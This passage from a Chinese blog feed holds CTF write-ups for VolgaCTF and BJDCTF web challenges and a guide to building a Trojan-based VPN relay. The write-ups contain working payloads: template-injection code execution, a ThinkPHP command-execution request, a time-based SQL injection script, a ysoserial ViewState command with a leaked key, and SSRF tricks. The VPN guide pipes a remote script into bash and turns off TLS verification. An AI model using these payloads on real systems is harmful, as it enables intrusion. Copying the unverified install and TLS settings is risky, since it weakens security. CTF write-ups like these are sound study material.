rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL</a> Injection )</p><p>看了他们的官方文档,英文看的头都痛了,才了解一些(平常翘英语课的后果//)</p><p>根据他们的例子找到了一个奇怪的query name</p><pre><code class="json">                     &quot;name&quot;: &quot;testGetUsersByFilter&quot;,                            &quot;description&quot;: &quot;&quot;,                            &quot;args&quot;: [                                {                                    &quot;name&quot;: &quot;filter&quot;,                                    &quot;description&quot;: &quot;&quot;,                                    &quot;type&quot;: {                                        &quot;kind&quot;: &quot;INPUT_OBJECT&quot;,                                        &quot;name&quot;: &quot;UserFilter&quot;,                                        &quot;ofType&quot;: null                                    },                                    &quot;defaultValue&quot;: null                                }                            ],                            &quot;type&quot;: {                                &quot;kind&quot;: &quot;LIST&quot;,                                &quot;name&quot;: null,                                &quot;ofType&quot;: {                                    &quot;kind&quot;: &quot;OBJECT&quot;,                                    &quot;name&quot;: &quot;User&quot;,                                    &quot;ofType&quot;: null                                }                            },                            &quot;isDeprecated&quot;: false,                            &quot;deprecationReason&quot;: null</code></pre><p>妥妥的薄弱点<br>构造</p><pre><code>query testGetUsersByFilter($input: UserFilter){    testGetUsersByFilter(filter:$input) {        name        login        email    }}{&quot;input&quot;:{&quot;login&quot;:&quot;\\&quot;,&quot;name&quot;:&quot; a&quot;,&quot;email&quot;:&quot;&quot;}}</code></pre><p>返回提示数据库错误,sql注入get</p><h3 id="User-Center"><a href="#User-Center" class="headerlink" title="User Center"></a>User Center</h3><p> <a href="https://spotless.tech/volgactf-2020-qualifier-user-center.html" target="_blank" rel="noopener">https://spotless.tech/volgactf-2020-qualifier-user-center.html</a> </p><p>总结:不同浏览器解析http报文的方式不同</p><p>子域可以修改域的cookie</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/03/30/volgactf/">https://www.ccreater.top/2020/03/30/volgactf/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF</title>
      <link href="2020/03/25/BJDCTF/"/>
      <url>2020/03/25/BJDCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="BJDCTF"></a>BJDCTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><pre><code>{{%27%27.__class__.__mro__[1].__subclasses__()[-13].__init__.__globals__.__builtins__.eval(%27__import__("os").popen("find%20/%20-name%20*flag*").read()%27)}}</code></pre><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old_hack"></a>old_hack</h3><pre><code class="php">POST /?s=captcha HTTP/1.1Host: eb9ceebf-0bf5-4943-8580-9ccbf630568e.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Connection: closeAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2DNT: 1Upgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 70_method=__construct&amp;filter%5B%5D=system&amp;method=get&amp;get%5B%5D=cat+/flag</code></pre><h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;give me a girl&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phperror_reporting(0);echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;if (!isset($_POST[&#39;girl_friend&#39;])) {    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);} else {    $girl = $_POST[&#39;girl_friend&#39;];    if (preg_match(&#39;/\&gt;|\\\/&#39;, $girl)) {        die(&#39;just girl&#39;);    } else if (preg_match(&#39;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#39;, $girl)) {        echo &quot;&lt;img src=&#39;img/p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;    } else {        //duangShell~~~~        exec($girl);    }}</code></pre><h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><pre><code class="python">username=a\&amp;password=/if(1,sleep(5),1)%23username=a\&amp;password=/if(select/**/substr(group_concat(database()),1,1),sleep(5),1)%23username=a\&amp;password=/if(substr(hex(password),1,1)&lt;5,sleep(5),1)%23</code></pre><p>过滤:<code>=,&#39;,;</code></p><pre><code class="python">import requestsimport timeburp0_url = &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn:80/index.php&quot;burp0_cookies = {&quot;_ga&quot;: &quot;GA1.2.212283867.1584191400&quot;, &quot;_gid&quot;: &quot;GA1.2.1374622556.1584775121&quot;}burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;, &quot;Origin&quot;: &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}burp0_data = {&quot;username&quot;: &quot;a\\&quot;, &quot;password&quot;: &quot;/if(substr(hex(password),1,1)&lt;5,sleep(6),1)#&quot;}count=0result=&quot;&quot;while True:    count+=1    for i in &quot;123456789ABCDEFG&quot;:        burp0_data = {&quot;username&quot;: &quot;a\\&quot;, &quot;password&quot;: &quot;/if(substr(hex(password),POS,1)&lt;GUESS,sleep(5),1)#&quot;.replace(&quot;POS&quot;,str(count)).replace(&quot;GUESS&quot;,hex(ord(i)))}        print(burp0_data[&#39;password&#39;])        try:            requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=5)            time.sleep(0.5)        except:            result+=chr(ord(i)-1)            print(result)            breakprint(result)#4F68794F75464F754E646974#OhyOuFOuNditrequests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</code></pre><h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p>更改cookie拿到密码</p><p>av11664517@1583985203.</p><p> <a href="https://www.bilibili.com/video/av11664517" target="_blank" rel="noopener">https://www.bilibili.com/video/av11664517</a> </p><p> BJD{Quantum_Mechanics_really_Ez} </p><h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><p> <a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</a> </p><pre><code>http://ff9359c1-85b4-4f2a-a1ad-31c1e40f186d.node3.buuoj.cn//ImgLoad.aspx?path=5.gif</code></pre><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration&gt;&lt;system.web&gt;&lt;machineKey validationKey=&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot; decryptionKey=&quot;B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5&quot; validation=&quot;SHA1&quot; decryption=&quot;3DES&quot; /&gt;&lt;/system.web&gt;&lt;/configuration&gt;</code></pre><p>validationKey泄露,利用viewstatas来任意命令执行</p><pre><code>ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile  -c &quot;ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll&quot;  --generator=&quot;CA0B0334&quot;  --validationalg=&quot;SHA1&quot;  --validationkey=&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</code></pre><h3 id="套猪"><a href="#套猪" class="headerlink" title="套猪"></a>套猪</h3><p>登陆后找到一个提示</p><p> L0g1n.php</p><p>经过输入一系列http头后拿到flag</p><pre><code>GET /L0g1n.php HTTP/1.1Host: node3.buuoj.cn:25341Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Contiki/1.1-rc1 (Commodore 64; http://dunkels.com/adam/contiki/)From: root@gem-love.comReferer: gem-love.comClient-Ip: 127.0.0.1Via: y1ng.vipAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; time=4740514103Connection: close</code></pre><h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><pre><code class="python">import requestsimport timearr=[&quot;H&quot;, &quot;He&quot;, &quot;Li&quot;, &quot;Be&quot;, &quot;B&quot;, &quot;C&quot;, &quot;N&quot;, &quot;O&quot;, &quot;F&quot;, &quot;Ne&quot;, &quot;Na&quot;, &quot;Mg&quot;, &quot;Al&quot;, &quot;Si&quot;, &quot;P&quot;, &quot;S&quot;, &quot;Cl&quot;, &quot;Ar&quot;, &quot;K&quot;, &quot;Ca&quot;, &quot;Sc&quot;, &quot;Ti&quot;, &quot;V&quot;, &quot;Cr&quot;, &quot;Mn&quot;, &quot;Fe&quot;, &quot;Co&quot;, &quot;Ni&quot;, &quot;Cu&quot;, &quot;Zn&quot;, &quot;Ga&quot;, &quot;Ge&quot;, &quot;As&quot;, &quot;Se&quot;, &quot;Br&quot;, &quot;Kr&quot;, &quot;Rb&quot;, &quot;Sr&quot;, &quot;Y&quot;, &quot;Zr&quot;, &quot;Nb&quot;, &quot;Mo&quot;, &quot;Te&quot;, &quot;Ru&quot;, &quot;Rh&quot;, &quot;Pd&quot;, &quot;Ag&quot;, &quot;Cd&quot;, &quot;In&quot;, &quot;Sn&quot;, &quot;Sb&quot;, &quot;Te&quot;, &quot;I&quot;, &quot;Xe&quot;, &quot;Cs&quot;, &quot;Ba&quot;, &quot;La&quot;, &quot;Ce&quot;, &quot;Pr&quot;, &quot;Nd&quot;, &quot;Pm&quot;, &quot;Sm&quot;, &quot;Eu&quot;, &quot;Gd&quot;, &quot;Tb&quot;, &quot;Dy&quot;, &quot;Ho&quot;, &quot;Er&quot;, &quot;Tm&quot;, &quot;Yb&quot;, &quot;Lu&quot;, &quot;Hf&quot;, &quot;Ta&quot;, &quot;W&quot;, &quot;Re&quot;, &quot;Os&quot;, &quot;Ir&quot;, &quot;Pt&quot;, &quot;Au&quot;, &quot;Hg&quot;, &quot;Tl&quot;, &quot;Pb&quot;, &quot;Bi&quot;, &quot;Po&quot;, &quot;At&quot;, &quot;Rn&quot;, &quot;Fr&quot;, &quot;Ra&quot;, &quot;Ac&quot;, &quot;Th&quot;, &quot;Pa&quot;, &quot;U&quot;, &quot;Np&quot;, &quot;Pu&quot;, &quot;Am&quot;, &quot;Cm&quot;, &quot;Bk&quot;, &quot;Cf&quot;, &quot;Es&quot;, &quot;Fm&quot;,&quot;Md&quot;,&quot;No&quot;,&quot;Lr&quot;,&quot;Ku&quot;,&quot;Ha&quot;]url=&quot;http://aca57d0d-cd67-498b-a8ea-09588ab05db6.node3.buuoj.cn/&quot;for i in arr:    r=requests.get(url+i+&quot;.php&quot;)    if r.status_code==200:        print(r.text,end=&quot;&quot;)    time.sleep(0.5)</code></pre><p><code>And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</code></p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>sb题目</p><p>index.php</p><pre><code class="php">&lt;?php   $a=$_GET[&#39;yds_is_so_beautiful&#39;];    echo unserialize($a);   ?&gt;</code></pre><h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h3><p>http头中找到hint:<code>home.php</code></p><pre><code>http://3801f870-f245-47ef-8325-1e117f384eb8.node3.buuoj.cn/home.php?file=system</code></pre><p>尝试文件包含,拿到源码</p><pre><code class="php">&lt;?phperror_reporting(0);if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !== sha1(md5(&#39;y1ng&#39;))){    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;/script&gt;&quot;;    header(&quot;Refresh:0.1;url=index.php&quot;);    die;}$str2 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;$str3 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;$str4 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;    &lt;title&gt;File Detector&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/normalize.css&quot; /&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/demo.css&quot; /&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/component.css&quot; /&gt;    &lt;script src=&quot;js/modernizr.custom.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;section&gt;    &lt;form id=&quot;theForm&quot; class=&quot;simform&quot; autocomplete=&quot;off&quot; action=&quot;system.php&quot; method=&quot;post&quot;&gt;        &lt;div class=&quot;simform-inner&quot;&gt;            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;            &lt;ol class=&quot;questions&quot;&gt;                &lt;li&gt;                    &lt;span&gt;&lt;label for=&quot;q1&quot;&gt;ä½ ç¥éç®å½ä¸é½æä»ä¹æä»¶å?&lt;/label&gt;&lt;/span&gt;                    &lt;input id=&quot;q1&quot; name=&quot;q1&quot; type=&quot;text&quot;/&gt;                &lt;/li&gt;                &lt;li&gt;                    &lt;span&gt;&lt;label for=&quot;q2&quot;&gt;è¯·è¾å¥ä½ æ³æ£æµæä»¶åå®¹é¿åº¦çurl&lt;/label&gt;&lt;/span&gt;                    &lt;input id=&quot;q2&quot; name=&quot;q2&quot; type=&quot;text&quot;/&gt;                &lt;/li&gt;                &lt;li&gt;                    &lt;span&gt;&lt;label for=&quot;q1&quot;&gt;ä½ å¸æä»¥ä½ç§æ¹å¼è®¿é®ï¼GETï¼POST?&lt;/label&gt;&lt;/span&gt;                    &lt;input id=&quot;q3&quot; name=&quot;q3&quot; type=&quot;text&quot;/&gt;                &lt;/li&gt;            &lt;/ol&gt;            &lt;button class=&quot;submit&quot; type=&quot;submit&quot; value=&quot;submit&quot;&gt;æäº¤&lt;/button&gt;            &lt;div class=&quot;controls&quot;&gt;                &lt;button class=&quot;next&quot;&gt;&lt;/button&gt;                &lt;div class=&quot;progress&quot;&gt;&lt;/div&gt;                &lt;span class=&quot;number&quot;&gt;                    &lt;span class=&quot;number-current&quot;&gt;&lt;/span&gt;                    &lt;span class=&quot;number-total&quot;&gt;&lt;/span&gt;                &lt;/span&gt;                &lt;span class=&quot;error-message&quot;&gt;&lt;/span&gt;            &lt;/div&gt;        &lt;/div&gt;        &lt;span class=&quot;final-message&quot;&gt;&lt;/span&gt;    &lt;/form&gt;    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href=&quot;https://gem-love.com&quot; target=&quot;_blank&quot;&gt;@é¢å¥L&#39;Amore&lt;/a&gt;&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;&lt;/section&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;js/classie.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;js/stepsForm.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var theForm = document.getElementById( &#39;theForm&#39; );    new stepsForm( theForm, {        onSubmit : function( form ) {            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );            var messageEl = theForm.querySelector( &#39;.final-message&#39; );            form.submit();            messageEl.innerHTML = &#39;Ok...Let me have a check&#39;;            classie.addClass( messageEl, &#39;show&#39; );        }    } );&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php$filter1 = &#39;/^http:\/\/127\.0\.0\.1\//i&#39;;$filter2 = &#39;/.?f.?l.?a.?g.?/i&#39;;if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) {    $url = $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;    $method = $_POST[&#39;q3&#39;];    $str1 = &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;;    echo $str1;    if (!preg_match($filter1, $url) ){        die($str2);    }    if (preg_match($filter2, $url)) {        die($str3);    }    if (!preg_match(&#39;/^GET/i&#39;, $method) &amp;&amp; !preg_match(&#39;/^POST/i&#39;, $method)) {        die($str4);    }    $detect = @file_get_contents($url, false);    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));}?&gt;</code></pre><p>home.php</p><pre><code class="php">&lt;?phpsetcookie(&quot;y1ng&quot;, sha1(md5(&#39;y1ng&#39;)), time() + 3600);setcookie(&#39;your_ip_address&#39;, md5($_SERVER[&#39;REMOTE_ADDR&#39;]), time()+3600);if(isset($_GET[&#39;file&#39;])){    if (preg_match(&quot;/\^|\~|&amp;|\|/&quot;, $_GET[&#39;file&#39;])) {        die(&quot;forbidden&quot;);    }    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;file&#39;])){        die(&quot;not now!&quot;);    }    if(preg_match(&quot;/.?a.?d.?m.?i.?n.?/i&quot;, $_GET[&#39;file&#39;])){        die(&quot;You! are! not! my! admin!&quot;);    }    if(preg_match(&quot;/^home$/i&quot;, $_GET[&#39;file&#39;])){        die(&quot;不要套娃&quot;);    }    else{        if(preg_match(&quot;/home$/i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;/system$/i&quot;, $_GET[&#39;file&#39;])){            $file = $_GET[&#39;file&#39;].&quot;.php&quot;;        }        else{            $file = $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;        }        echo &quot;你现在访问的是&quot;.$file . &quot;&lt;br&gt;&quot;;        require $file;    }} else {    echo &quot;&lt;script&gt;location.href=&#39;./home.php?file=system&#39;&lt;/script&gt;&quot;;}</code></pre><p>我们看到:</p><pre><code class="php">$filter1 = &#39;/^http:\/\/127\.0\.0\.1\//i&#39;;$filter2 = &#39;/.?f.?l.?a.?g.?/i&#39;;    if (!preg_match($filter1, $url) ){        die($str2);    }    if (preg_match($filter2, $url)) {        die($str3);    }    if (!preg_match(&#39;/^GET/i&#39;, $method) &amp;&amp; !preg_match(&#39;/^POST/i&#39;, $method)) {        die($str4);    }    $detect = @file_get_contents($url, false);    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</code></pre><p>我们利用<code>$method</code>来转义<code>%d</code>,在<code>$url</code>中加个<code>%s</code>就可以查看ssrf的内容了</p><p>扫描目录发现:admin.php,但是要从内网访问</p><p>ssrf访问得到</p><pre><code class="php">0 &lt;?phperror_reporting(0);session_start();$f1ag = &#39;f1ag{s1mpl3_SSRF_@nd_spr1ntf}&#39;; //fakefunction aesEn($data, $key){    $method = &#39;AES-128-CBC&#39;;    $iv = md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));}function Check(){    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] === md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] === sha1(md5(&#39;y1ng&#39;)))        return true;    else        return false;}if ( $_SERVER[&#39;REMOTE_ADDR&#39;] == &quot;127.0.0.1&quot; ) {    highlight_file(__FILE__);} else {    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#39;10px&#39; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];}$_SESSION[&#39;user&#39;] = md5($_SERVER[&#39;REMOTE_ADDR&#39;]);if (isset($_GET[&#39;decrypt&#39;])) {    $decr = $_GET[&#39;decrypt&#39;];    if (Check()){        $data = $_SESSION[&#39;secret&#39;];        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;        $cipher = aesEn($data, &#39;y1ng&#39;);        if ($decr === $cipher){            echo WHAT_YOU_WANT;        } else {            die(&#39;爬&#39;);        }    } else{        header(&quot;Refresh:0.1;url=index.php&quot;);    }} else {    //I heard you can break PHP mt_rand seed    mt_srand(rand(0,9999999));    $length = mt_rand(40,80);    $_SESSION[&#39;secret&#39;] = bin2hex(random_bytes($length));}?&gt;</code></pre><p>我们发现如果我们带decrypt参数直接访问,就不会生成secret了,那么<code>$cipher = aesEn(&#39;&#39;, &#39;y1ng&#39;);</code></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/03/25/BJDCTF/">https://www.ccreater.top/2020/03/25/BJDCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vpn搭建</title>
      <link href="2020/03/20/vpn%E6%90%AD%E5%BB%BA/"/>
      <url>2020/03/20/vpn%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="vpn搭建小记"><a href="#vpn搭建小记" class="headerlink" title="vpn搭建小记"></a>vpn搭建小记</h1><p>刚好最近有人叫我帮忙搭个vpn自己去了解了一下,发现搭vpn还挺有意思的</p><h2 id="vpn的最终方案"><a href="#vpn的最终方案" class="headerlink" title="vpn的最终方案"></a>vpn的最终方案</h2><p>经过自己瞎折腾后最后是搞成这样的:</p><p>家宽-内地中转服务器-gfw-国外vps(使用trojan+bbr)</p><p>以后打算在gfw和国外vps在加个cdn,这样我们vps对gfw也就是透明的了,以后gfw把我们vps的ip ban掉了也没关系,不太好的影响就是延迟会变高</p><p>这里加个中转服务器是因为电信晚上网络会炸裂,而家宽就是电信,虽然手机是联通的,但是我自己一个月40g流量都不够用</p><blockquote><p>电信 163 网连接国际网络，会在高峰时段，在路由出海前的最后一跳，根据优先级，策略性地人为丢包，以减轻对主网的负担(QOS)，这让普通电信用户糟糕的外网访问质量雪上加霜 </p></blockquote><h2 id="vpn搭建具体细节"><a href="#vpn搭建具体细节" class="headerlink" title="vpn搭建具体细节"></a>vpn搭建具体细节</h2><h3 id="国外vps选购"><a href="#国外vps选购" class="headerlink" title="国外vps选购"></a>国外vps选购</h3><p>首先是vpn的选购,因为是萌新,就去了别人推荐的vultr,搬瓦工太贵了</p><p>听说vultr销毁服务器,再重新购买会有新的ip,但是我这样弄还是同一个被ban掉的ip,后来小脑瓜一动,我一口气开了10个服务器,这样ip就不一样了,我真tm机智/cy</p><p>具体怎么选购就百度谷歌吧</p><h3 id="国外vps配置"><a href="#国外vps配置" class="headerlink" title="国外vps配置"></a>国外vps配置</h3><p>这里用波仔提供的一键安装脚本,看了一下没啥安全问题</p><p> <a href="https://www.v2rayssr.com/trojan-1.html/comment-page-1" target="_blank" rel="noopener">https://www.v2rayssr.com/trojan-1.html/comment-page-1</a> </p><p>这里你还需要一个域名,建议用二级域名来弄trojan</p><blockquote><ol><li><p><code>bash &lt;(curl -s -L https://github.com/V2RaySSR/Trojan/raw/master/Trojan.sh)</code></p></li><li><p>先安装bbr,除了重启的选y,其他都选no</p></li><li><p>再次运行脚本,运行bbr,并优化配置</p></li><li><p>安装trojan</p></li><li><p>下载客户端</p></li></ol></blockquote><p>视频教程: <a href="https://www.youtube.com/watch?v=LgZKirXKZms&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LgZKirXKZms&amp;feature=youtu.be</a> </p><h3 id="中转服务器配置"><a href="#中转服务器配置" class="headerlink" title="中转服务器配置"></a>中转服务器配置</h3><p>中转服务器去买共享端口+docker虚拟机的那种,一个月5元左右吧,出口最好联通</p><p>xxx.sh</p><pre><code class="shell">#!/bin/bashif [ ! $# -eq 3 ];then    echo -e &quot;Usage : $0 natport trojanserver trojanport&quot;    exitfinatport=$1trojanserver=$2trojanport=$3apt-get install iptables || yum install iptablesiptables -t nat -A PREROUTING -p tcp --dport $natport  -j DNAT --to-destination &quot;$trojanserver:$trojanport&quot;iptables -t nat -A POSTROUTING -d $trojanserver -p tcp --dport $trojanport -j MASQUERADEiptables -I FORWARD -d $trojanserver -p tcp --dport  $trojanport -j ACCEPTiptables -I FORWARD -s $trojanserver  -p tcp --sport  $trojanport -j ACCEPTservice iptables saveservice iptables restartecho &quot;setting complete&quot;</code></pre><h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>将config.json拷贝一份,config_through_nat.json</p><p>并做出如下修改</p><pre><code class="json">{    ...    &quot;remote_addr&quot;: &quot;中转服务器ip&quot;,    &quot;remote_port&quot;: 中转的端口,   ...    &quot;ssl&quot;: {        &quot;verify&quot;: false,        &quot;verify_hostname&quot;: false,        ...    }    ...}</code></pre><p>config.json重命名为:config_normal.json</p><p>start.bat</p><pre><code class="shell">@ECHO OFFtaskkill /im trojan.exe /fping -n 2 127.1 &gt;nulcopy /Y config_normal.json config.json%1 start mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~0&quot;&quot; ::&quot;,0)(window.close)&amp;&amp;exitstart /b trojan.exe</code></pre><p>start_with_nat.bat</p><pre><code class="shell">@ECHO OFFtaskkill /im trojan.exe /fping -n 2 127.1 &gt;nulcopy /Y config_through_nta.json config.json%1 start mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~0&quot;&quot; ::&quot;,0)(window.close)&amp;&amp;exitstart /b trojan.exe</code></pre><p>将两个批处理放到trojan客户端目录下</p><h2 id="vpn测试"><a href="#vpn测试" class="headerlink" title="vpn测试"></a>vpn测试</h2><p>通过 <a href="https://fast.com/" target="_blank" rel="noopener">https://fast.com/</a>  来测速 稳定10Mbits(联通),5Mbits(电信平时),500Kbits(电信夜间,丢包率贼高,体验极差),稳定1Mbits(走中转服务器路线,因为我专门拿来中转的服务器还没买,暂时直接用阿里云的服务器来中转,但是阿里云服务器也在电信机房),去买了个中转的服务器现在夜间电信稳定5Mbits</p><p>利用BEST TRACE来看vps的线路</p><p>各种线路的分析文章: <a href="https://www.duangvps.com/archives/135" target="_blank" rel="noopener">https://www.duangvps.com/archives/135</a> </p><p>youtube打开4k视频右键查看统计信息,我的是5w左右</p><p>linux回程路由测试: <a href="https://github.com/nanqinlang-script/testrace" target="_blank" rel="noopener">https://github.com/nanqinlang-script/testrace</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/03/20/vpn搭建/">https://www.ccreater.top/2020/03/20/vpn搭建/</a> 